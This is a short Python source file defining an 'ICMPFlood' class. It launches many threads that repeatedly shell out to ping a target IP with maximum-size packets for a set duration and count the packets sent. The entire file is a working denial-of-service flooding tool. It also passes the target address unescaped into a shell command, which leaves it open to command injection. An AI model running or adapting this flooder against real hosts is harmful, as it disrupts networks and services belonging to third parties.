import os
import random
import threading
import time
import subprocess

class ICMPFlood:
    def __init__(self):
        self.packet_count = 0
    
    def launch(self, target_ip, target_port, duration, threads):
        def flood():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    cmd = f"ping -c 1 -s 65507 {target_ip} > /dev/null 2>&1"
                    subprocess.run(cmd, shell=True)
                    self.packet_count += 1
                except:
                    pass
        
        worker_threads = []
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        for t in worker_threads:
            t.join(timeout=duration)
        
        return self.packet_count
